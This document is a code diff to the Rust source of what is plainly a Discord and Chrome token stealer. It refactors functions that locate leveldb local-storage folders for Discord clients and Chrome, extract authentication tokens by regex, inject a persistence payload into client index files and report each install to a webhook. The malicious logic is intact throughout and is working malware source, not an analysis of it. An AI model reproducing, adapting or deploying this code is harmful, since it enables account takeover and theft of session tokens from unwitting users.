@@ -6,47 +6,6 @@ use std::fs::OpenOptions;
 use std::io::prelude::*;
 use std::path::PathBuf;
 
-pub fn get_paths() -> Vec<PathBuf> {
-    let app_data = dirs::config_dir();
-
-    if app_data.is_none() {
-        return Vec::new();
-    }
-
-    let app_data = app_data.unwrap();
-
-    const POSSIBLE_FOLDERS: [&'static str; 4] =
-        ["Discord", "discordcanary", "discordptb", "Google"];
-
-    let mut paths: Vec<PathBuf> = Vec::new();
-
-    for folder in POSSIBLE_FOLDERS.iter() {
-        if folder == &"Google" {
-            let new_path = app_data
-                .join(folder)
-                .join("Chrome")
-                .join("User Data")
-                .join("Default")
-                .join("Local Storage")
-                .join("leveldb");
-            if !new_path.exists() || !new_path.is_dir() {
-                continue;
-            }
-
-            paths.push(new_path)
-        } else {
-            let new_path = app_data.join(folder).join("Local Storage").join("leveldb");
-            if !new_path.exists() || !new_path.is_dir() {
-                continue;
-            }
-
-            paths.push(new_path);
-        }
-    }
-
-    paths
-}
-
 fn get_persistence_paths() -> Vec<PathBuf> {
     let app_data = dirs::config_dir();
 
@@ -89,15 +48,24 @@ fn get_persistence_paths() -> Vec<PathBuf> {
     paths
 }
 
-pub fn get_token_from_file(token_regex: &Regex, file: &PathBuf) -> Option<String> {
-    let raw_bytes = fs::read(file).unwrap();
-    let text = String::from_utf8_lossy(&raw_bytes);
-    let caps = token_regex.captures(&text);
-    if let Some(caps) = caps {
-        return Some(caps.get(0).unwrap().as_str().to_string());
-    } else {
-        return None;
+fn dump_to_file(index_file: &PathBuf, payload: &str) {
+    let mut file_handle = OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(&index_file)
+        .expect("failed to open file");
+
+    let mut file_data = String::new();
+    file_handle
+        .read_to_string(&mut file_data)
+        .expect("unable to read file");
+
+    if file_data.chars().count() > 500 {
+        return; //already installed persist - ghetto way
     }
+    file_handle
+        .write_all(format!("\n{}", payload).as_bytes())
+        .expect("unable to write to file");
 }
 
 pub fn inject_persistence() {
@@ -110,27 +78,64 @@ pub fn inject_persistence() {
             continue;
         }
 
-        let mut file_handle = OpenOptions::new()
-            .read(true)
-            .write(true)
-            .open(&index_file)
-            .expect("failed to open file");
+        dump_to_file(&index_file, &to_dump);
 
-        let mut file_data = String::new();
-        file_handle
-            .read_to_string(&mut file_data)
-            .expect("unable to read file");
-
-        if file_data.chars().count() > 500 {
-            return; //already installed persist - ghetto way
-        }
-        file_handle
-            .write_all(format!("\n{}", to_dump).as_bytes())
-            .expect("unable to write to file");
         network::send_webhook_message(&format!(
             "installed persistence to {}",
             index_file.display()
         ));
+    }
+}
+
+fn get_paths() -> Vec<PathBuf> {
+    let app_data = dirs::config_dir();
+
+    if app_data.is_none() {
+        return Vec::new();
+    }
+
+    let app_data = app_data.unwrap();
+
+    const POSSIBLE_FOLDERS: [&'static str; 4] =
+        ["Discord", "discordcanary", "discordptb", "Google"];
+
+    let mut paths: Vec<PathBuf> = Vec::new();
+
+    for folder in POSSIBLE_FOLDERS.iter() {
+        if folder == &"Google" {
+            let new_path = app_data
+                .join(folder)
+                .join("Chrome")
+                .join("User Data")
+                .join("Default")
+                .join("Local Storage")
+                .join("leveldb");
+            if !new_path.exists() || !new_path.is_dir() {
+                continue;
+            }
+
+            paths.push(new_path)
+        } else {
+            let new_path = app_data.join(folder).join("Local Storage").join("leveldb");
+            if !new_path.exists() || !new_path.is_dir() {
+                continue;
+            }
+
+            paths.push(new_path);
+        }
+    }
+
+    paths
+}
+
+fn get_token_from_file(token_regex: &Regex, file: &PathBuf) -> Option<String> {
+    let raw_bytes = fs::read(file).unwrap();
+    let text = String::from_utf8_lossy(&raw_bytes);
+    let caps = token_regex.captures(&text);
+    if let Some(caps) = caps {
+        return Some(caps.get(0).unwrap().as_str().to_string());
+    } else {
+        return None;
     }
 }
 
